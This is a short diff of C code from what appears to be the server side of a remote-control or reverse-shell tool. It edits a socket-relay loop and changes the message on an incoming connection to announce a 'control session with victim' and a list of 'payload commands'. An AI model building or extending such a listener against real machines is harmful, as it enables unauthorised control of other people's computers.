@@ -25,7 +25,7 @@ void *Thread(void *arg)
     char buffer[MAXBUF];
 
     while ((n = read(a.src, buffer, MAXBUF - 1)) > 0)
-    {
+    {	
         write(a.dest, buffer, n);
     }
 
@@ -126,7 +126,8 @@ void Server(char *address, char *port, int *type, int *family)
 
     char victim_address[INET_ADDRSTRLEN];
     inet_ntop( AF_INET, &ipAddr, victim_address, INET_ADDRSTRLEN );
-    printf("Connection received - starting session %i with victim %s\n", a.dest, victim_address);
+    printf("Connection received - starting control session with victim %s\n", victim_address);
+    printf("Type \"help\" to see a list of payload commands\n");
     
     if (pthread_create(&printer, NULL, Thread, (void *)&a) != 0)
     {
